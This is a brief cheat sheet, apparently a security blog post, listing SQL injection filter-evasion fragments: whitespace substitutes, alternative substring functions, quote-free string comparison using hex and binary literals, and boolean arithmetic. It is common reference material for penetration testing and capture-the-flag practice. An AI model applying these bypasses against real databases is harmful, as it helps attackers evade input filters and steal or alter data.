---
title: ["SQL Injection Cheat Sheet"]
date: 2024-12-01 09:00:00 +0900
categories: [cheatsheet, sqli]
tags: [web, sqli, cheatsheet]
---

### White Space
```
%20  // SPACE
%09  // HORIZONTAL TAB
%0a  // LINE FEED
%0b  // VERTICAL TAB
%0c  // FORM FEED
%0d  // CARRIAGE RETURN
%a0  // NBSP
/**/
select(id)from(table)where(id=1)
```

### Substring
```
substr(id,1,1)
substr(id from 1 for 1)
mid(id,1,1)
right(left(id,1),1)
lpad(id,1,space(1))
reverse(right(reverse(id),1))
convert(id,char(1))
```

### String Compare without Single Quotation
```
admin=0x61646d696e                                 // using Hex
admin=0b0110000101100100011011010110100101101110   // using Binary
substr(monthname(from_unixtime(1)),2,1)='a'        // using Gadget
```

### Number Expression
```
True = 1
False = 0
True+True = 2
True-True = 0
```